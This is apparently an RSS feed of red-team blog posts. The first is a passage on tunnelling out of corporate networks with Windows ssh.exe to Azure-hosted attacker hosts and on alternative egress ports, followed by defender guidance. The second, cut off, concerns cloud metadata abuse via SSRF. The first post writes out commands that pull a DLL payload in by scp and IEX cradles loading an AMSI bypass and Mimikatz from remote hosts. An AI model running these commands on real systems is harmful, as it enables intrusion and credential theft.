+&lt;p&gt;On Red Siege’s &lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing&lt;/a&gt; blog post the author described &lt;a href=&#34;https://superuser.com/questions/1489017/login-to-ssh-with-no-password-and-no-ssh-key&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;not requiring a password OR key&lt;/a&gt; to login plus the -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; flag to disable the “Are you sure you want to continue connecting (Yes/No/Fingerprint)” message so that the command could be inside of an Lnk file or a Malicious Office macro, but I still have reservations regarding not requiring authentication to access your C2 server (even if it’s a limitaccess user with /bin/false as default shell).&lt;/p&gt;
+&lt;h3&gt;2. Azure domain / ASN to get pass firewall&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-azure-domain--asn-to-get-pass-firewall&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#2-azure-domain--asn-to-get-pass-firewall&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Azure Domains&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-domains&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#azure-domains&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;A good indication of the client’s firewall having absolutely no blocks on SSH is when an SSH host that they almost certainly have no use for is allowed, such as:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh root@scanme.nmap.org
+# if you get a  prompt, you&amp;#39;ve struck gold!
+# pls don&amp;#39;t do anything abusive or malicious to scanme.nmap.org!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;Of course, it is not always so easy that it works right away, and whilst not in assumed breach you wouldn’t have the luxury of a PowerShell session to check the client’s firewall. So, what if Scanme is not reachable? The first thing I would try is to use a VPS on Azure. The underlying reason is that Windows environments are highly likely to be on Active Directory and most likely Hybrid. There is a high likelihood that the client’s stack requires either Microsoft own IPs to be allowlisted, or Azure subdomains to be blanket trusted.&lt;/p&gt;
+&lt;p&gt;What I’d do is to spin up a VM from Azure and then give it an azure subdomain from the Public IP address settings: Public IP &amp;gt; Settings &amp;gt; Configuration &amp;gt; DNS name label (optional) -&amp;gt; Enter your desired subdomain name.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/screenshot2.png&#34; title=&#34;screenshot2&#34; alt=&#34;screenshot2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;screenshot2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 user@innocent-looking-front.REGION.cloudapp.azure.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;Something mundane such as msservicesupdate.uksouth.cloudapp.azure.com should be fine. This has been proven to work in many of our engagements.&lt;/p&gt;
+&lt;h3&gt;ASN to the rescue&lt;span class=&#34;absolute -mt-20&#34; id=&#34;asn-to-the-rescue&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#asn-to-the-rescue&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Domains tend to have higher success rates on phish emails or C2 callbacks because corporate firewalls tend to block requests to raw non-internal IPs. However, &lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2021/03/26/securing-our-approach-to-domain-fronting-within-azure/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Azure domain fronting&lt;/a&gt; (some practitioners use Azure CDN fronting) is actually known to Microsoft themselves too. Perhaps the blue team / Sysadmin in the client knew this and blocked outbound access to *.region.cloudapp.azure.com for example because they know about this technique and give their own DNS hostnames to their Azure VMs?&lt;/p&gt;
+&lt;p&gt;In this case even if the subdomain is blocked, you could / should try the raw IP anyway because it is on Microsoft owned ASN. I have had it happen that using the raw IP worked, so it is definitely worth a try when you’re desperate. The IP address would be in Microsoft’s ASN and there could be an allowlist somewhere that green lights the range.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 limiteduser@1.2.3.4(azure_vm_ip)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;h3&gt;3. Alternative Egress Port&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-alternative-egress-port&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#3-alternative-egress-port&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Sometimes outbound port 22 to the internet is (fortunately or unfortunately) blocked on the client’s endpoint. However there’s also a catch that not all corporate firewalls inspect the underlying protocol / do SSL stripping and deep packet inspection (so-called Application Layer Firewalls). It is definitely worth a try to set the ssh port to non-22 on your VPS and restart SSHD. Port 80, 443, 53 tend to be good candidates for this to work. I’ve sometimes even seen Windows / AD ports outbound to be allowed, stuff I wouldn’t expect like NETBIOS(139), KERBEROS(88) , SMB(445), LDAP(389) but sometimes it is needed for certain Azure / Entra interaction. Of course classic service ports like SMTP(25), FTP(21) and so on are also within reason to try, but personally I’ve had less luck with those.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# edit /etc/ssh/sshd_config with your favorite text editor
+Port 
+
+# save and close 
+# don&amp;#39;t forget to allow inbound on this port from your IP on your cloud provider), then:
+
+sudo systemctl restart sshd&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;h2&gt;(Bonus) What else could you do with this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;bonus-what-else-could-you-do-with-this&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bonus-what-else-could-you-do-with-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are a couple of use cases other than just running offensive tooling through an available outbound SSH connection:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Getting payloads in and data out:&lt;/strong&gt; If you can get SSH out, then either getting payload in or exfiltrate data out via SCP shouldn’t be a problem:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;scp.exe user@unsuspecting.uksouth.cloudapp.azure.com:/home/user/totally_okay_payload.dll C:\Public\AppData\version.dll&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;(More) OpSec safe In memory powershell script execution with IEX:&lt;/strong&gt; If you have a good Amsi bypass, ssh is a good way to grab it along with other powershell scripts, especially with how scrutinised Invoke-WebRequest is. The common way observed in the wild to invoke scripts is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.X.X.X/invoke-mimikatz.ps1&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;In a constrained PS environment the (New-Object) cmdlet would not even work, and secondly this command has been signatured to death so it’s probably not a smart thing to do in a covert job. However, you can run one command upon ssh-ing into a host in the format of:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh user@server &amp;#34;command arg arg2 ...&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;Essentially you can use this to cradle your AMSI bypass with a malicious script like so (this again can also be bundled into the Lnk file or a malicious macro):&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/amsibypass.ps1&amp;#34;); IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/invoke-mimikatz.ps1&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;How to secure this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-to-secure-this&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#how-to-secure-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Removing the SSH client:&lt;/strong&gt; It is recommended to remove the builtin SSH client for non-technical staff. It can be done by first removing the SSH client with Settings’ &amp;gt; ‘Apps’ &amp;gt; ‘Optional Features’ &amp;gt; Search for “OpenSSH” and hit Uninstall then reboot. It however is still in System32. Uninstalling the SSH client from the endpoint is not yet complete after this, as described in the PTP blog post. To further remove the binaries:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;takeown /F C:\Windows\System32\OpenSSH /R /D Y
+icacls C:\Windows\System32\OpenSSH /grant administrators:F /T
+rmdir /s C:\Windows\System32\OpenSSH&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Secure the corporate firewall settings:&lt;/strong&gt; Even if the SSH client is no longer present in the endpoint, the attacker could still move a LOLBin version (signed by Microsoft) onto the user endpoint, or operate from an internal Linux /Mac machine for example. The first order of business is of course blocking outbound TCP connections on port 22 if it is not needed. I’m no firewall expert but for firewalls that support application level operations, SSL stripping with protocol inspection should be performed on ports not meant for SSH (443 and so on) and block connections where the protocols are not matched. There are probably no good recommendations from me for clients who need to allowlist Microsoft ASN IP or Azure subdomains for SSH access unfortunately. If the reader has good ideas on this by all means let me know!&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Monitor for the user endpoints for the SSH binary being called:&lt;/strong&gt; For non-technical staff, the SSH &amp;amp; SCP binaries have little reason to be called at all. A custom alert could be written fire off when SSH.exe or SCP.exe is called (optionally, with filehash matching as well).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In summary, SSH.exe has been bundled with Windows 10, 11 &amp;amp; Windows Server since late 2017 and signed by Microsoft. The reverse dynamic proxy is very powerful and there are a number of tricks that can be used to punch through corporate firewalls to get a reliable tunnel for offensive tooling to compromise entire AD domains. Defenders are recommended to watch for invocation of this binary on endpoints used by non-technical users, or uninstall the feature entirely.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>How Cloud Migration is Affecting AppSec - A Red Teamer&#39;s Perspective</title>
+      <link>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</link>
+      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</guid>
+      <description>
+        
+        
+        &lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. &lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;The Traditional Approach&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-traditional-approach&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#the-traditional-approach&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image8&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;&lt;em&gt;Reference: &lt;a href=&#34;https://www.wallarm.com/what/what-is-a-dmz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.wallarm.com/what/what-is-a-dmz&lt;/a&gt;&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found &lt;a href=&#34;https://labs.jumpsec.com/butting-heads-with-a-threat-actor-on-an-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Cloud-Hosted&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-hosted&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cloud-hosted&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image10&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;To understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch &lt;a href=&#34;https://www.youtube.com/watch?v=OaG6wHlhbCQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks”&lt;/em&gt; - Risk3Sixty&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Here, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this &lt;a href=&#34;http://169.254.169.254&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://169.254.169.254&lt;/a&gt;, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. &lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Cloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;With the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;AWS&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;aws&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 1:  401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h6&gt;Figure 2: Bash script for gaining access to IMDSv2 &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-2-bash-script-for-gaining-access-to-imdsv2&#34;&gt;&lt;/span&gt;
